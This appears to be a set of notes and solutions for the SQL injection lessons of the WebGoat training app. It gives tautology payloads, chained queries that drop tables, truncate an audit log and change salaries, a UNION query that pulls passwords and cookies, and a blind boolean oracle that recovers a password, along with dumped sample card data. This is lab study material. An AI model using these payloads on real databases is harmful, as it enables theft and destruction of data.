

++++++++++++++++++++++++++++
++++++++++++++++++++++++++++

"SELECT * FROM users WHERE name = 'Smith=11111'";

 
Here are some examples of what a hacker could supply to the input field to perform actions on the database that go further than just reading the data of a single user:

    Smith’ OR '1' = '1
    results in SELECT * FROM users WHERE name = 'Smith' OR TRUE; and that way will return all entries from the users table

    Smith’ OR 1 = 1; --
    results in SELECT * FROM users WHERE name = 'Smith' OR TRUE;--'; and that way will return all entries from the users table

    Smith’; DROP TABLE users; TRUNCATE audit_log; --
    chains multiple SQL-Commands and deletes the USERS table as well as entries from the audit_log


++++++++++++++++++++++++++++
++++++++++++++++++++++++++++

Your query was: SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'

' 	
You have succeeded:

USERID, FIRST_NAME, LAST_NAME, CC_NUMBER, CC_TYPE, COOKIE, LOGIN_COUNT,
101, Joe, Snow, 987654321, VISA, , 0,
101, Joe, Snow, 2234200065411, MC, , 0,
102, John, Smith, 2435600002222, MC, , 0,
102, John, Smith, 4352209902222, AMEX, , 0,
103, Jane, Plane, 123456789, MC, , 0,
103, Jane, Plane, 333498703333, AMEX, , 0,
10312, Jolly, Hershey, 176896789, MC, , 0,
10312, Jolly, Hershey, 333300003333, AMEX, , 0,
10323, Grumpy, youaretheweakestlink, 673834489, MC, , 0,
10323, Grumpy, youaretheweakestlink, 33413003333, AMEX, , 0,
15603, Peter, Sand, 123609789, MC, , 0,
15603, Peter, Sand, 338893453333, AMEX, , 0,
15613, Joesph, Something, 33843453533, AMEX, , 0,
15837, Chaos, Monkey, 32849386533, CM, , 0,
19204, Mr, Goat, 33812953533, VISA, , 0,
Your query was: SELECT * FROM user_data WHERE first_name = 'John' and last_name = 'Smith' or '1' = '1'

++++++++++++++++++++++++++++
++++++++++++++++++++++++++++

Your query was: SELECT * From user_data WHERE Login_Count = 0 and userid= 0 or true

++++++++++++++++++++++++++++
++++++++++++++++++++++++++++

'; update employees set salary = 832832383 where last_name = 'Smith' --

++++++++++++++++++++++++++++
++++++++++++++++++++++++++++


Employee Name: A
Authentication TAN: '; UPDATE employees SET salary=99999 WHERE first_name='John
Hint Use the techniques that you have learned before.
Hint The application takes your input and filters for entries that are LIKE it.
Hint Try query chaining to reach the goal.
Hint The DDL allows you to delete (DROP) database tables.
Hint The underlying SQL query looks like that: "SELECT * FROM access_log WHERE action LIKE '%" + action + "%'".
Hint Remember that you can use the -- metacharacter to comment out the rest of the line.

Action contains: %'; DROP TABLE access_log;--

SQL Injection (advanced)
Hint Remember that when using an UNION each SELECT statement within UNION must have the same number of columns.
Hint The data type of a column in the first SELECT statement must have a similar data type to that in the second SELECT statement.
Hint Your new SQL query must end with a comment. eg: --
Hint If a column needs a String you could substitute something like 'a String' for it. For integers you could substitute a 1.

Name: '; SELECT * FROM user_system_data;-- or ' UNION SELECT 1, user_name, password, cookie, 'A', 'B', 1 from user_system_data;--
Password: passW0rD
Hint Look at the different response you receive from the server
Hint The vulnerability is on the register form
Hint The vulnerable field is the username field of the register form.
Hint Use tooling to automate this attack
Hint The table name is randomized at each start of WebGoat, try to figure out the name first.
Hint Change the password through an UPDATE Statement.

As specified in the hints, it is possible to change the password using an UPDATE. It is also possible to find the original password as we will see in the proposed solution.

The Login form does not appear to provide any useful outputs from a variety of inputs, but the Register form allows us to check whether a username already exists.
If we try to register with the following username: tom' AND '1'='1 we find that the username is taken.
We can use this as an oracle and check what Tom's password is one at a time.
Fortunately, the table we are seeking is named password (guessing), so we can attempt to register with the following username: tom' AND substring(password,1,1)='t
The response states the username already exists, we know that t is the first character of Tom's password.
By fuzzing for the remaining characters, we can determine that Tom's password is thisisasecretfortomonly.

++++++++++++++++++++++++++++
++++++++++++++++++++++++++++
